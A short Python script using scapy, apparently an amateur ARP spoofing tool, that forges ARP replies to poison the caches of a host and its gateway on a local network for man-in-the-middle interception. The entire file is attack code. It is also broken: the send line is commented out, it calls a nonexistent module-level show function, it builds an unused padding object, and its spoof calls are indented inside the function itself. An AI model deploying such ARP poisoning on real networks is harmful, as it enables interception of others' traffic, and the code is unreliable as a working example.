#!/usr/bin/env python3

import scapy.all as scapy
import time

print("----ARP Spoof----")
print("----Made By Harshit Oberoi----\n")


def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	scapy.Padding(load = "X"*18)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.show(packet)
	# scapy.send(packet, verbose=False)

# while True:	
	spoof("10.0.2.15", "10.0.2.1")
	spoof("10.0.2.1", "10.0.2.15")
	# time.sleep(2)

